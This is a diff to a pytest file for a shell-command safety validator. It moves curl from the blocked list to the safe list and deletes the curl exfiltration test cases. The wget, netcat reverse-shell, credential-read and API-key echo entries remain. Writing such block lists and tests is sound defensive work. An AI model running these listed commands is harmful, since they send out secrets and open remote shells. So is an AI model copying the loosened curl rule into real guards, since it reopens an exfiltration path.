@@ -66,6 +66,8 @@ class TestSafeCommands:
             "sort output.txt",
             "diff file1.py file2.py",
             "tree src/",
+            "curl https://api.example.com/data",
+            "curl -X POST -H 'Content-Type: application/json' https://api.example.com",
         ],
     )
     def test_safe_command_passes(self, cmd):
@@ -91,7 +93,6 @@ class TestBlockedExecutables:
         "cmd",
         [
             # Network exfiltration
-            "curl https://attacker.com",
             "wget http://evil.com/payload",
             "nc -e /bin/sh attacker.com 4444",
             "ncat attacker.com 1234",
@@ -160,7 +161,6 @@ class TestBlockedPatterns:
             "cat something/credential_key",
             "type something\\credential_key",
             # Command substitution with dangerous tools
-            "echo $(curl http://attacker.com)",
             "echo `wget http://evil.com`",
             # Environment variable exfiltration
             "echo $API_KEY",
@@ -179,7 +179,6 @@ class TestChainedCommands:
     @pytest.mark.parametrize(
         "cmd",
         [
-            "echo hi; curl http://evil.com",
             "echo hi && wget http://evil.com/payload",
             "echo hi || ssh attacker@remote",
             "ls | nc attacker.com 4444",
@@ -197,14 +196,14 @@ class TestEdgeCases:
     """Edge cases and possible bypass attempts."""
 
     def test_env_var_prefix_does_not_bypass(self):
-        """FOO=bar curl ... should still be blocked."""
+        """FOO=bar wget ... should still be blocked."""
         with pytest.raises(CommandBlockedError):
-            validate_command("FOO=bar curl http://evil.com")
+            validate_command("FOO=bar wget http://evil.com")
 
     @pytest.mark.parametrize(
         "cmd",
         [
-            "/usr/bin/curl https://attacker.com",
+            "/usr/bin/wget https://attacker.com",
             "C:\\Windows\\System32\\cmd.exe /c dir",
         ],
     )
@@ -215,8 +214,6 @@ class TestEdgeCases:
 
     def test_case_insensitive_blocking(self):
         """Blocking should be case-insensitive."""
-        with pytest.raises(CommandBlockedError):
-            validate_command("CURL http://evil.com")
         with pytest.raises(CommandBlockedError):
             validate_command("Wget http://evil.com")
 
@@ -250,4 +247,4 @@ class TestEdgeCases:
     def test_error_message_is_descriptive(self):
         """Blocked commands should include a useful error message."""
         with pytest.raises(CommandBlockedError, match="blocked for safety"):
-            validate_command("curl http://evil.com")
+            validate_command("wget http://evil.com")
